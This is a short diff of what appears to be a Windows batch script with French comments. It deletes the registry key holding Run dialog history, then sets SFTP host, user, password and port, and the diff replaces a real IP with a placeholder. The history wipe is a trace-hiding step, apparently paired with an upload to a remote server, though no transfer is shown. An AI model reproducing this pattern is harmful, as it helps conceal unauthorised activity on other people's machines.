@@ -5,7 +5,7 @@ REM Delete registry keys storing Run dialog history
 rem mettre des guillemets pour le mot de passe !
 rem mettre une redirection > C:\Temp\test.txt pour debug
 REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
-SET sftphost=185.178.48.116
+SET sftphost=IP.IP.IP.IP
 SET sftpuser=XXXX
 SET sftppass="XXXX"
 SET sftpport=31569
